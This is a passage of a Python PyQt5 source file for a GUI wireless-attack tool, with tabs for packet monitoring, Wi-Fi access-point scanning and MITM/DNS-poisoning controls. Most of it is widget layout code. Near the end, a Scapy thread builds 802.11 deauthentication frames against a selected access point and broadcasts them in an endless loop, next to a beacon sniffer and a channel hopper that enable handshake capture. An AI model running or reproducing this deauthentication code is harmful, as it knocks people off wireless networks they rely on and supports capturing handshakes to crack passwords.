        self.Nano_HashCapture_button.setObjectName("Nano_HashCapture_button")
        self.Nano_Stop_button = QtWidgets.QPushButton(self.Nano_tab)
        self.Nano_Stop_button.setGeometry(QtCore.QRect(579, -1, 221, 41))
        sizePolicy = QtWidgets.QSizePolicy(QtWidgets.QSizePolicy.Expanding, QtWidgets.QSizePolicy.Fixed)
        sizePolicy.setHorizontalStretch(0)
        sizePolicy.setVerticalStretch(0)
        sizePolicy.setHeightForWidth(self.Nano_Stop_button.sizePolicy().hasHeightForWidth())
        self.Nano_Stop_button.setSizePolicy(sizePolicy)
        font = QtGui.QFont()
        font.setFamily("Inter")
        font.setPointSize(11)
        font.setBold(False)
        font.setItalic(False)
        font.setWeight(50)
        self.Nano_Stop_button.setFont(font)
        self.Nano_Stop_button.setStyleSheet("font: 400 11pt \"Inter\";")
        self.Nano_Stop_button.setObjectName("Nano_Stop_button")
        self.Nano_start_button = QtWidgets.QPushButton(self.Nano_tab)
        self.Nano_start_button.setGeometry(QtCore.QRect(361, -1, 221, 41))
        sizePolicy = QtWidgets.QSizePolicy(QtWidgets.QSizePolicy.Expanding, QtWidgets.QSizePolicy.Fixed)
        sizePolicy.setHorizontalStretch(0)
        sizePolicy.setVerticalStretch(0)
        sizePolicy.setHeightForWidth(self.Nano_start_button.sizePolicy().hasHeightForWidth())
        self.Nano_start_button.setSizePolicy(sizePolicy)
        font = QtGui.QFont()
        font.setFamily("Inter")
        font.setPointSize(11)
        font.setBold(False)
        font.setItalic(False)
        font.setWeight(50)
        self.Nano_start_button.setFont(font)
        self.Nano_start_button.setStyleSheet("font: 400 11pt \"Inter\";")
        self.Nano_start_button.setObjectName("Nano_start_button")
        self.Nano_Panda_Animation_Textedit.raise_()
        self.Nano_Access_points_Dropdown.raise_()
        self.Nano_Noti_Textedit.raise_()
        self.Nano_DeAuth_pushbutton.raise_()
        self.Nano_HashCapture_button.raise_()
        self.layoutWidget.raise_()
        self.Nano_Access_points_scan_textedit.raise_()
        self.Main_Tab.addTab(self.Nano_tab, "")
        self.Lowkey_tab = QtWidgets.QWidget()
        self.Lowkey_tab.setObjectName("Lowkey_tab")
        self.Lowkey_mainMonitor_button = QtWidgets.QTextEdit(self.Lowkey_tab)
        self.Lowkey_mainMonitor_button.setGeometry(QtCore.QRect(-2, -1, 341, 441))
        self.Lowkey_mainMonitor_button.setStyleSheet("background-color: #0323a3;")
        self.Lowkey_mainMonitor_button.setObjectName("Lowkey_mainMonitor_button")
        self.line = QtWidgets.QFrame(self.Lowkey_tab)
        self.line.setGeometry(QtCore.QRect(140, 440, 20, 111))
        self.line.setFrameShape(QtWidgets.QFrame.VLine)
        self.line.setFrameShadow(QtWidgets.QFrame.Sunken)
        self.line.setObjectName("line")
        self.Lowkey_MITM_screen_textedit = QtWidgets.QTextEdit(self.Lowkey_tab)
        self.Lowkey_MITM_screen_textedit.setGeometry(QtCore.QRect(564, -2, 231, 280))
        font = QtGui.QFont()
        font.setFamily("Inter")
        font.setPointSize(8)
        font.setBold(False)
        font.setWeight(50)
        font.setKerning(True)
        self.Lowkey_MITM_screen_textedit.setFont(font)
        self.Lowkey_MITM_screen_textedit.setStyleSheet("background-color: rgb(36, 31, 49);\n""color: rgb(255, 255, 255);")
        self.Lowkey_MITM_screen_textedit.setFrameShape(QtWidgets.QFrame.Box)
        self.Lowkey_MITM_screen_textedit.setFrameShadow(QtWidgets.QFrame.Plain)
        self.Lowkey_MITM_screen_textedit.setLineWidth(2)
        self.Lowkey_MITM_screen_textedit.setObjectName("Lowkey_MITM_screen_textedit")
        self.line_2 = QtWidgets.QFrame(self.Lowkey_tab)
        self.line_2.setGeometry(QtCore.QRect(341, 105, 221, 20))
        self.line_2.setFrameShape(QtWidgets.QFrame.HLine)
        self.line_2.setFrameShadow(QtWidgets.QFrame.Sunken)
        self.line_2.setObjectName("line_2")
        self.Lowkety_MITM_Button = QtWidgets.QPushButton(self.Lowkey_tab)
        self.Lowkety_MITM_Button.setGeometry(QtCore.QRect(341, 123, 221, 31))
        font = QtGui.QFont()
        font.setFamily("Arimo")
        font.setPointSize(9)
        font.setBold(False)
        font.setWeight(50)
        font.setKerning(True)
        self.Lowkety_MITM_Button.setFont(font)
        self.Lowkety_MITM_Button.setObjectName("Lowkety_MITM_Button")
        self.line_3 = QtWidgets.QFrame(self.Lowkey_tab)
        self.line_3.setGeometry(QtCore.QRect(341, 151, 221, 20))
        self.line_3.setFrameShape(QtWidgets.QFrame.HLine)
        self.line_3.setFrameShadow(QtWidgets.QFrame.Sunken)
        self.line_3.setObjectName("line_3")
        self.Lowkey_Add_button = QtWidgets.QPushButton(self.Lowkey_tab)
        self.Lowkey_Add_button.setGeometry(QtCore.QRect(340, 302, 81, 31))
        font = QtGui.QFont()
        font.setFamily("Arimo")
        font.setPointSize(10)
        font.setBold(False)
        font.setWeight(50)
        font.setKerning(True)
        self.Lowkey_Add_button.setFont(font)
        self.Lowkey_Add_button.setObjectName("Lowkey_Add_button")
        self.Lowkey_DnsSpoofing_button = QtWidgets.QPushButton(self.Lowkey_tab)
        self.Lowkey_DnsSpoofing_button.setGeometry(QtCore.QRect(341, 486, 221, 31))
        font = QtGui.QFont()
        font.setFamily("Arimo")
        font.setPointSize(9)
        font.setBold(False)
        font.setWeight(50)
        font.setKerning(True)
        self.Lowkey_DnsSpoofing_button.setFont(font)
        self.Lowkey_DnsSpoofing_button.setObjectName("Lowkey_DnsSpoofing_button")
        self.layoutWidget1 = QtWidgets.QWidget(self.Lowkey_tab)
        self.layoutWidget1.setGeometry(QtCore.QRect(190, 440, 111, 101))
        self.layoutWidget1.setObjectName("layoutWidget1")
        self.verticalLayout = QtWidgets.QVBoxLayout(self.layoutWidget1)
        self.verticalLayout.setContentsMargins(0, 0, 0, 0)
        self.verticalLayout.setObjectName("verticalLayout")
        self.Lowkey_openports_checkbox = QtWidgets.QCheckBox(self.layoutWidget1)
        self.Lowkey_openports_checkbox.setStyleSheet("font: 300 8pt \"Inter\";")
        self.Lowkey_openports_checkbox.setObjectName("Lowkey_openports_checkbox")
        self.verticalLayout.addWidget(self.Lowkey_openports_checkbox)
        self.checkBox_5 = QtWidgets.QCheckBox(self.layoutWidget1)
        self.checkBox_5.setStyleSheet("font: 300 8pt \"Inter\";")
        self.checkBox_5.setObjectName("checkBox_5")
        self.verticalLayout.addWidget(self.checkBox_5)
        self.Lowkey_Mac_Address_Checkbox = QtWidgets.QCheckBox(self.layoutWidget1)
        self.Lowkey_Mac_Address_Checkbox.setStyleSheet("font: 300 8pt \"Inter\";")
        self.Lowkey_Mac_Address_Checkbox.setObjectName("Lowkey_Mac_Address_Checkbox")
        self.verticalLayout.addWidget(self.Lowkey_Mac_Address_Checkbox)
        self.layoutWidget2 = QtWidgets.QWidget(self.Lowkey_tab)
        self.layoutWidget2.setGeometry(QtCore.QRect(10, 439, 93, 101))
        self.layoutWidget2.setObjectName("layoutWidget2")
        self.verticalLayout_2 = QtWidgets.QVBoxLayout(self.layoutWidget2)
        self.verticalLayout_2.setContentsMargins(0, 0, 0, 0)
        self.verticalLayout_2.setObjectName("verticalLayout_2")
        self.Lowkey_ARP_Checkbox = QtWidgets.QCheckBox(self.layoutWidget2)
        self.Lowkey_ARP_Checkbox.setStyleSheet("font: 300 8pt \"Inter\";")
        self.Lowkey_ARP_Checkbox.setObjectName("Lowkey_ARP_Checkbox")
        self.verticalLayout_2.addWidget(self.Lowkey_ARP_Checkbox)
        self.Lowkey_PingScan_Chackbox = QtWidgets.QCheckBox(self.layoutWidget2)
        self.Lowkey_PingScan_Chackbox.setStyleSheet("font: 300 8pt \"Inter\";")
        self.Lowkey_PingScan_Chackbox.setObjectName("Lowkey_PingScan_Chackbox")
        self.verticalLayout_2.addWidget(self.Lowkey_PingScan_Chackbox)
        self.Lowkey_TCP_Chackbox = QtWidgets.QCheckBox(self.layoutWidget2)
        self.Lowkey_TCP_Chackbox.setStyleSheet("font: 300 8pt \"Inter\";")
        self.Lowkey_TCP_Chackbox.setObjectName("Lowkey_TCP_Chackbox")
        self.verticalLayout_2.addWidget(self.Lowkey_TCP_Chackbox)
        self.layoutWidget3 = QtWidgets.QWidget(self.Lowkey_tab)
        self.layoutWidget3.setGeometry(QtCore.QRect(340, 72, 221, 38))
        self.layoutWidget3.setObjectName("layoutWidget3")
        self.horizontalLayout_2 = QtWidgets.QHBoxLayout(self.layoutWidget3)
        self.horizontalLayout_2.setContentsMargins(0, 0, 0, 0)
        self.horizontalLayout_2.setObjectName("horizontalLayout_2")
        self.Lowkey_Stopbutton = QtWidgets.QPushButton(self.layoutWidget3)
        font = QtGui.QFont()
        font.setFamily("Arimo")
        font.setPointSize(9)
        font.setBold(True)
        font.setWeight(75)
        font.setKerning(True)
        self.Lowkey_Stopbutton.setFont(font)
        self.Lowkey_Stopbutton.setObjectName("Lowkey_Stopbutton")
        self.horizontalLayout_2.addWidget(self.Lowkey_Stopbutton)
        self.Lowkey_Start_button = QtWidgets.QPushButton(self.layoutWidget3)
        font = QtGui.QFont()
        font.setFamily("Arimo")
        font.setPointSize(9)
        font.setBold(True)
        font.setWeight(75)
        font.setKerning(True)
        self.Lowkey_Start_button.setFont(font)
        self.Lowkey_Start_button.setObjectName("Lowkey_Start_button")
        self.horizontalLayout_2.addWidget(self.Lowkey_Start_button)
        self.layoutWidget4 = QtWidgets.QWidget(self.Lowkey_tab)
        self.layoutWidget4.setGeometry(QtCore.QRect(345, 0, 211, 71))
        self.layoutWidget4.setObjectName("layoutWidget4")
        self.gridLayout_2 = QtWidgets.QGridLayout(self.layoutWidget4)
        self.gridLayout_2.setContentsMargins(0, 0, 0, 0)
        self.gridLayout_2.setObjectName("gridLayout_2")
        self.Lowkey_Source_IP_Label = QtWidgets.QLabel(self.layoutWidget4)
        font = QtGui.QFont()
        font.setFamily("Inter")
        font.setPointSize(10)
        font.setBold(False)
        font.setWeight(50)
        font.setKerning(True)
        self.Lowkey_Source_IP_Label.setFont(font)
        self.Lowkey_Source_IP_Label.setStyleSheet("color: rgb(0, 0, 0);")
        self.Lowkey_Source_IP_Label.setObjectName("Lowkey_Source_IP_Label")
        self.gridLayout_2.addWidget(self.Lowkey_Source_IP_Label, 1, 0, 1, 1)
        self.Lowkey_Target_IP_Label = QtWidgets.QLabel(self.layoutWidget4)
        font = QtGui.QFont()
        font.setFamily("Inter")
        font.setPointSize(10)
        font.setBold(False)
        font.setWeight(50)
        font.setKerning(True)
        self.Lowkey_Target_IP_Label.setFont(font)
        self.Lowkey_Target_IP_Label.setStyleSheet("color: rgb(0, 0, 0);")
        self.Lowkey_Target_IP_Label.setObjectName("Lowkey_Target_IP_Label")
        self.gridLayout_2.addWidget(self.Lowkey_Target_IP_Label, 2, 0, 1, 1)
        self.Lowkey_Target_IP_Combobox = QtWidgets.QComboBox(self.layoutWidget4)
        self.Lowkey_Target_IP_Combobox.setObjectName("Lowkey_Target_IP_Combobox")
        self.gridLayout_2.addWidget(self.Lowkey_Target_IP_Combobox, 2, 1, 1, 1)
        self.Lowkey_Source_IP_Combobox = QtWidgets.QComboBox(self.layoutWidget4)
        self.Lowkey_Source_IP_Combobox.setObjectName("Lowkey_Source_IP_Combobox")
        self.gridLayout_2.addWidget(self.Lowkey_Source_IP_Combobox, 1, 1, 1, 1)
        self.layoutWidget5 = QtWidgets.QWidget(self.Lowkey_tab)
        self.layoutWidget5.setGeometry(QtCore.QRect(341, 162, 221, 136))
        self.layoutWidget5.setObjectName("layoutWidget5")
        self.verticalLayout_3 = QtWidgets.QVBoxLayout(self.layoutWidget5)
        self.verticalLayout_3.setContentsMargins(0, 0, 0, 0)
        self.verticalLayout_3.setObjectName("verticalLayout_3")
        self.lowkey_Domain_Label = QtWidgets.QLabel(self.layoutWidget5)
        font = QtGui.QFont()
        font.setFamily("Inter")
        font.setPointSize(9)
        font.setBold(False)
        font.setWeight(50)
        font.setKerning(True)
        self.lowkey_Domain_Label.setFont(font)
        self.lowkey_Domain_Label.setStyleSheet("color: rgb(0, 0, 0);")
        self.lowkey_Domain_Label.setObjectName("lowkey_Domain_Label")
        self.verticalLayout_3.addWidget(self.lowkey_Domain_Label)
        self.lowkey_Domain_Dialogbox = QtWidgets.QComboBox(self.layoutWidget5)
        self.lowkey_Domain_Dialogbox.setObjectName("lowkey_Domain_Dialogbox")
        self.verticalLayout_3.addWidget(self.lowkey_Domain_Dialogbox)
        self.lowkey_IPAddress_label = QtWidgets.QLabel(self.layoutWidget5)
        font = QtGui.QFont()
        font.setFamily("Inter")
        font.setPointSize(9)
        font.setBold(False)
        font.setWeight(50)
        font.setKerning(True)
        self.lowkey_IPAddress_label.setFont(font)
        self.lowkey_IPAddress_label.setStyleSheet("color: rgb(0, 0, 0);")
        self.lowkey_IPAddress_label.setObjectName("lowkey_IPAddress_label")
        self.verticalLayout_3.addWidget(self.lowkey_IPAddress_label)
        self.lowkey_IPaddress_Dialog_box = QtWidgets.QComboBox(self.layoutWidget5)
        self.lowkey_IPaddress_Dialog_box.setObjectName("lowkey_IPaddress_Dialog_box")
        self.verticalLayout_3.addWidget(self.lowkey_IPaddress_Dialog_box)
        self.Lowkey_DNS_spoofing_screen_textedit = QtWidgets.QTextEdit(self.Lowkey_tab)
        self.Lowkey_DNS_spoofing_screen_textedit.setGeometry(QtCore.QRect(565, 278, 231, 280))
        font = QtGui.QFont()
        font.setFamily("Inter")
        font.setPointSize(8)
        font.setBold(False)
        font.setWeight(50)
        font.setKerning(True)
        self.Lowkey_DNS_spoofing_screen_textedit.setFont(font)
        self.Lowkey_DNS_spoofing_screen_textedit.setStyleSheet("background-color: rgb(36, 31, 49);\n""color: rgb(255, 255, 255);")
        self.Lowkey_DNS_spoofing_screen_textedit.setFrameShape(QtWidgets.QFrame.Box)
        self.Lowkey_DNS_spoofing_screen_textedit.setFrameShadow(QtWidgets.QFrame.Plain)
        self.Lowkey_DNS_spoofing_screen_textedit.setLineWidth(1)
        self.Lowkey_DNS_spoofing_screen_textedit.setObjectName("Lowkey_DNS_spoofing_screen_textedit")
        self.Lowkey_DNS_ip2domain_screen_textedit = QtWidgets.QTextEdit(self.Lowkey_tab)
        self.Lowkey_DNS_ip2domain_screen_textedit.setGeometry(QtCore.QRect(341, 340, 221, 141))
        font = QtGui.QFont()
        font.setFamily("Inter")
        font.setPointSize(8)
        font.setBold(False)
        font.setWeight(50)
        font.setKerning(True)
        self.Lowkey_DNS_ip2domain_screen_textedit.setFont(font)
        self.Lowkey_DNS_ip2domain_screen_textedit.setStyleSheet("background-color: rgb(36, 31, 49);\n""color: rgb(255, 255, 255);")
        self.Lowkey_DNS_ip2domain_screen_textedit.setObjectName("Lowkey_DNS_ip2domain_screen_textedit")
        self.Main_Tab.addTab(self.Lowkey_tab, "")
        MainWindow.setCentralWidget(self.centralwidget)

        self.retranslateUi(MainWindow)
        self.Main_Tab.setCurrentIndex(0)
        QtCore.QMetaObject.connectSlotsByName(MainWindow)
    def retranslateUi(self, MainWindow):
        _translate = QtCore.QCoreApplication.translate
        MainWindow.setWindowTitle(_translate("MainWindow", "MainWindow"))
        self.Monitor_mainscreen_textEdit.setHtml(_translate("MainWindow", "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0//EN\" \"http://www.w3.org/TR/REC-html40/strict.dtd\">\n"
        "<html><head><meta name=\"qrichtext\" content=\"1\" /><style type=\"text/css\">\n"
        "p, li { white-space: pre-wrap; }\n"
        "</style></head><body style=\" font-family:\'Noto Serif CJK SC\'; font-size:500pt; font-weight:400; color:white; font-style:normal;\">\n"
        "<p style=\"-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0;color:white; text-indent:0px; font-size:9pt; font-weight:400;\"><br /></p></body></html>"))
        self.Monitor_count_label.setText(_translate("MainWindow", "Count: 0"))
        self.Monitor_Start_Button.setText(_translate("MainWindow", "Start"))
        self.Monitor_save_button.setText(_translate("MainWindow", "Save"))
        self.Monitor_TCP_Count_label.setText(_translate("MainWindow", "TCP: 0"))
        self.Monitor_UDP_Count_label.setText(_translate("MainWindow", "UDP: 0"))
        self.Monitor_ARP_Count_label.setText(_translate("MainWindow", "ARP: 0"))
        self.Monitor_ICMP_Count_label.setText(_translate("MainWindow", "ICMP: 0"))
        self.Monitor_DNS_Count_label.setText(_translate("MainWindow", "DNS: 0"))
        self.Monitor_TLS_Count_label.setText(_translate("MainWindow", "TLS: 0"))
        self.Monitor_Search_button.setText(_translate("MainWindow", "Search"))
        self.Monitor_TLS_Search_Checkbox.setText(_translate("MainWindow", "TLS"))
        self.Monitor_UDP_Search_Checkbox.setText(_translate("MainWindow", "UDP"))
        self.Monitor_DNS_Search_Checkbox.setText(_translate("MainWindow", "DNS"))
        self.Monitor_TCP_Search_Checkbox.setText(_translate("MainWindow", "TCP"))
        self.Monitor_ARP_Search_Checkbox.setText(_translate("MainWindow", "ARP"))
        self.Monitor_ICMP_Search_Checkbox.setText(_translate("MainWindow", "ICMP"))
        self.Monitor_count_label_2.setText(_translate("MainWindow", "00:00:00"))
        self.Monitor_search_save_button.setText(_translate("MainWindow", "Save"))
        self.Monitor_search_clear_button.setText(_translate("MainWindow", "Clear"))
        self.Main_Tab.setTabText(self.Main_Tab.indexOf(self.monitor_tab), _translate("MainWindow", "Monitor"))
        self.Nano_Panda_Animation_Textedit.setText(_translate("MainWindow",panda_animation_frames[0]))
        self.Nano_Access_points_scan_textedit.setHtml(_translate("MainWindow", self.nano_scanbox_default_html))
        self.Nano_DeAuth_pushbutton.setText(_translate("MainWindow", "De-Authentication"))
        self.Nano_HashCapture_button.setText(_translate("MainWindow", "Handshake Capture"))
        self.Nano_Stop_button.setText(_translate("MainWindow", "Stop"))
        self.Nano_start_button.setText(_translate("MainWindow", "Start"))
        self.Main_Tab.setTabText(self.Main_Tab.indexOf(self.Nano_tab), _translate("MainWindow", "Nano"))
        self.Lowkey_mainMonitor_button.setHtml(_translate("MainWindow", "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0//EN\" \"http://www.w3.org/TR/REC-html40/strict.dtd\">\n"
        "<html><head><meta name=\"qrichtext\" content=\"1\" /><style type=\"text/css\">\n"
        "p, li { white-space: pre-wrap; }\n"
        "</style></head><body style=\" font-family:\'DejaVu Sans Mono\'; font-size:8pt; font-weight:400; font-style:normal;\">\n"
        "<p style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"><span style=\" font-size:6pt;\"><br /></span></p></body></html>"))
        self.Lowkey_MITM_screen_textedit.setHtml(_translate("MainWindow", "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0//EN\" \"http://www.w3.org/TR/REC-html40/strict.dtd\">\n"
        "<html><head><meta name=\"qrichtext\" content=\"1\" /><style type=\"text/css\">\n"
        "p, li { white-space: pre-wrap; }\n"
        "</style></head><body style=\" font-family:\'Inter\',\'DejaVu Sans Mono\'; font-size:8pt; font-weight:400; font-style:normal;\">\n"
        "<p style=\"-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px; font-family:\'Inter\';\"><br /></p></body></html>"))
        self.Lowkety_MITM_Button.setText(_translate("MainWindow", "MITM"))
        self.Lowkey_Add_button.setText(_translate("MainWindow", "ADD"))
        self.Lowkey_DnsSpoofing_button.setText(_translate("MainWindow", "DNS Poisoning"))
        self.Lowkey_openports_checkbox.setText(_translate("MainWindow", "OPEN PORTS"))
        self.checkBox_5.setText(_translate("MainWindow", "DEVICE"))
        self.Lowkey_Mac_Address_Checkbox.setText(_translate("MainWindow", "MAC ADDRESS"))
        self.Lowkey_ARP_Checkbox.setText(_translate("MainWindow", "ARP SCAN"))
        self.Lowkey_PingScan_Chackbox.setText(_translate("MainWindow", "PING SCAN"))
        self.Lowkey_TCP_Chackbox.setText(_translate("MainWindow", "TCP SYN"))
        self.Lowkey_Stopbutton.setText(_translate("MainWindow", "Start"))
        self.Lowkey_Start_button.setText(_translate("MainWindow", "Stop"))
        self.Lowkey_Source_IP_Label.setText(_translate("MainWindow", "Source : "))
        self.Lowkey_Target_IP_Label.setText(_translate("MainWindow", "Target :"))
        self.lowkey_Domain_Label.setText(_translate("MainWindow", "Domain :"))
        self.lowkey_IPAddress_label.setText(_translate("MainWindow", "IP Address : "))
        self.Lowkey_DNS_spoofing_screen_textedit.setHtml(_translate("MainWindow", "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0//EN\" \"http://www.w3.org/TR/REC-html40/strict.dtd\">\n"
        "<html><head><meta name=\"qrichtext\" content=\"1\" /><style type=\"text/css\">\n"
        "p, li { white-space: pre-wrap; }\n"
        "</style></head><body style=\" font-family:\'Inter\',\'DejaVu Sans Mono\'; font-size:8pt; font-weight:400; font-style:normal;\">\n"
        "<p style=\"-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"><br /></p></body></html>"))
        self.Lowkey_DNS_ip2domain_screen_textedit.setHtml(_translate("MainWindow", "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0//EN\" \"http://www.w3.org/TR/REC-html40/strict.dtd\">\n"
        "<html><head><meta name=\"qrichtext\" content=\"1\" /><style type=\"text/css\">\n"
        "p, li { white-space: pre-wrap; }\n"
        "</style></head><body style=\" font-family:\'Inter\',\'DejaVu Sans Mono\'; font-size:8pt; font-weight:400; font-style:normal;\">\n"
        "<p style=\"-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"><br /></p></body></html>"))
        self.Main_Tab.setTabText(self.Main_Tab.indexOf(self.Lowkey_tab), _translate("MainWindow", "Lowkey"))
#----------------------------------------------MONITOR START--------------------------------------------------------- 
        self.Monitor_IP_Search_comboBox.addItem("None",None)
        self.Monitor_Start_Button.clicked.connect(self.monitor_start_clicked)
        self.Monitor_save_button.clicked.connect(self.monitor_save_file)
        self.Monitor_IP_Textedit.setHtml(self.monitor_ip_table.get_html_string())
        print(self.monitor_ip_table.get_html_string())
        self.Monitor_Search_button.clicked.connect(self.monitor_search_function)
        self.Monitor_search_clear_button.clicked.connect(self.monitor_search_clear_button_clicked)
        self.Monitor_search_save_button.clicked.connect(self.monitor_search_save_clicked)
#----------------------------------------------MONITOR end--------------------------------------------------------- 
#----------------------------------------------NANO CHANGES START---------------------------------------------------------  
        self.Nano_start_button.clicked.connect(self.nano_start_button_clicked)
        self.Nano_Stop_button.clicked.connect(self.nano_stop_clicked)
        self.Nano_DeAuth_pushbutton.clicked.connect(self.nano_deauth_clients)
        self.Nano_DeAuth_pushbutton.setEnabled(False)
        self.Nano_HashCapture_button.setEnabled(False)
        self.Nano_Stop_button.setEnabled(False)
#----------------------------------------------NANO CHANGES END---------------------------------------------------------    
#----------------------------------------------NANO functions START--------------------------------------------------------- 
    nano_scanning_isActive=False
    Nano_Deauth_isActive=False
    Nano_Handshake_capture_isActive=False
    def nano_start_button_clicked(self):
        self.Nano_Access_points_Dropdown.clear()
        self.Nano_Access_points_scan_textedit.setHtml(self.nano_scanbox_default_html)
        self.nano_device_count=0
        self.nano_access_points.clear()
        self.nano_start_panda_animation()
        self.nano_start_scanning()
        self.Nano_DeAuth_pushbutton.setEnabled(True)
        self.Nano_HashCapture_button.setEnabled(True)
        self.Nano_Stop_button.setEnabled(True)
    def nano_start_panda_animation(self):
        self.panda_animation=animate_thread()
        self.panda_animation.send_frame.connect(self.nano_animate_box)
        self.panda_animation.start()
    def nano_animate_box(self,frame):
        self.Nano_Panda_Animation_Textedit.setText(str(frame))
    def nano_stop_clicked(self):
        if self.nano_scanning_isActive:
            self.nano_wifi_scanner.terminate()
            self.nano_hopper.terminate()
            self.nano_scanning_isActive=False
        if self.Nano_Deauth_isActive:
            self.nano_deauther.terminate()
            self.Nano_Deauth_isActive=False
        if self.Nano_Handshake_capture_isActive:
            pass
        self.nano_hopper.terminate()
        self.nano_wifi_scanner.terminate()
        self.panda_animation.terminate()
        self.panda_animation.terminate()
        self.Nano_Panda_Animation_Textedit.setText(panda_animation_frames[0])

    def nano_start_scanning(self):
        self.nano_wifi_scanner=find_devices()
        self.nano_hopper=channel_hopper()
        self.nano_wifi_scanner.found_signal.connect(self.nano_device_found)
        self.nano_hopper.start()
        self.nano_wifi_scanner.start()
        self.nano_scanning_isActive=True

    def nano_device_found(self, device):
        if device not in self.nano_access_points:
            self.hasStartedOnce=True
            self.nano_device_count += 1
            self.nano_access_points.append(device)
            self.Nano_Access_points_Dropdown.addItem(f"{device[1]}({device[0]})", device)
            device_html = f'''
                <tr style="color: {choice(self.nano_light_colors)}; text-align:center;">
                    <td>{self.nano_device_count}</td>
                    <td>{device[0]}</td>
                    <td>{device[1]}</td>
                    <td>{device[2]}</td>
                </tr>
            '''
            current_html = self.Nano_Access_points_scan_textedit.toHtml()
            new_html = current_html.replace('</table>', f"{device_html} </table>")
            self.Nano_Access_points_scan_textedit.setHtml(new_html)
    def nano_deauth_clients(self):
        access_point=self.Nano_Access_points_Dropdown.currentData()
        self.nano_deauther=deauth_class()
        self.nano_deauther.formating(device=access_point)
        self.nano_deauther.start()
        self.Nano_Deauth_isActive=True
        print("deauthing started")
#----------------------------------------------NANO functions END--------------------------------------------------------- 
#---------------------------------------NANO CLASSES START-------------------------------------------------
class deauth_class(QtCore.QThread):
    def formating(self,device):
        self.device=device
    def run(self):
        deauth_packet=RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=self.device[1], addr3=self.device[1]) / Dot11Deauth()
        print("sending deauth packet")
        while True:
            sendp(deauth_packet,iface="wlp3s0mon", inter=0.1, verbose=0)
            print("sent deaith packet")
class animate_thread(QtCore.QThread):
    send_frame=QtCore.pyqtSignal(str)
    def run(self):
        while True:
            for i in panda_animation_frames:
                self.send_frame.emit(i)
                time.sleep(1/14)
            for i in reversed(panda_animation_frames[:-1]):
                self.send_frame.emit(i)
                time.sleep(1/14)
class find_devices(QtCore.QThread):
    found_signal=QtCore.pyqtSignal(list)
    def run(self):
        sniff(iface="wlp3s0mon",prn=self.get_access_points)

    def get_access_points(self, packet):
        self.name, self.channel = self.extract_name_and_channel(packet)
        self.bssid = self.extract_bssid(packet)
        if self.name=="not found":
            pass
        else:
            self.device = [self.name, self.bssid, self.channel]
            # Emit the signal in the context of the main thread
            self.found_signal.emit(self.device)

    def extract_name_and_channel(self, packet):
        if packet.haslayer(Dot11Beacon):
            beacon_frame = packet[Dot11Beacon]

            if beacon_frame.payload and (beacon_frame.payload.ID == 0):
                name = beacon_frame.payload.info.decode("ascii")
            else:
                name = "not found"

            if beacon_frame.haslayer(Dot11EltDSSSet):
                channel_frame = beacon_frame[Dot11EltDSSSet]
                channel = channel_frame.channel
            else:
                channel = 0
        else:
            name="not found"
            channel="0"

        return name, channel

    def extract_bssid(self, packet):
        if packet.haslayer(Dot11):
            dot11_layer = packet[Dot11]
            bssid = dot11_layer.addr2 if dot11_layer.addr2 else "ff:ff:ff:ff:ff:ff"
        else:
            bssid = "ff:ff:ff:ff:ff:ff"
        return bssid
class channel_hopper(QtCore.QThread):
    channels=[1,2,3,4,5,6,7,8,9,10,11]
    def run(self):
        while True:
            channel=choice(self.channels)
            os.system("iw dev {} set channel {}".format("wlp3s0mon",channel))
            time.sleep(0.2)
#---------------------------------------NANO CLASSES END-------------------------------------------------
if __name__ == "__main__":
    import sys
    app = QtWidgets.QApplication(sys.argv)
    MainWindow = QtWidgets.QMainWindow()
    ui = Ui_MainWindow()
    ui.setupUi(MainWindow)
    MainWindow.show()
    sys.exit(app.exec_())
